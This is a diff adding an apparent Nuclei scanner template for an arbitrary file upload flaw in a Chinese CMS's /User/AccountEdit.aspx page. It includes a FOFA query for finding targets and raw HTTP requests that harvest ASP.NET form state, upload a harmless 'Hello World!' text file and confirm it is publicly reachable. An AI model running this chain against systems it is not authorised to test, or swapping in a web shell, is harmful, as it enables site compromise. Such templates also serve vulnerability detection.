@@ -1,0 +1,88 @@
+id: WQ-AccountEdit-FileUpload
+
+info:
+  name: 微擎系统-任意文件上传-AccountEdit
+  author: HackTwo
+  severity: high
+  metadata: 
+    fofa-query: body="/Widgets/WidgetCollection/"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /User/AccountEdit.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+      - |
+        POST /User/AccountEdit.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: multipart/form-data;boundary=---------------------------786435874t38587593865736587346567358735687
+
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        {{path1}}
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+        {{path2}}
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="{{filename}}.txt"
+        Content-Type: text/plain
+
+        Hello World!
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"
+
+        上传图片
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"
+
+
+        -----------------------------786435874t38587593865736587346567358735687
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"
+
+
+        -----------------------------786435874t38587593865736587346567358735687--
+
+      - |
+        GET /_data/Uploads/{{path3}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+
+
+    extractors:
+      - type: regex
+        name: path1
+        group: 1
+        regex:
+           - 'id="__VIEWSTATE" value="(\S*)"'
+        internal: true
+
+
+      - type: regex
+        name: path2
+        group: 1
+        regex:
+           - 'id="__EVENTVALIDATION" value="(\S*)"'
+        internal: true
+
+      - type: regex
+        name: path3
+        group: 1
+        regex:
+           - '_data/Uploads/(\S*).txt'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"Hello World!")
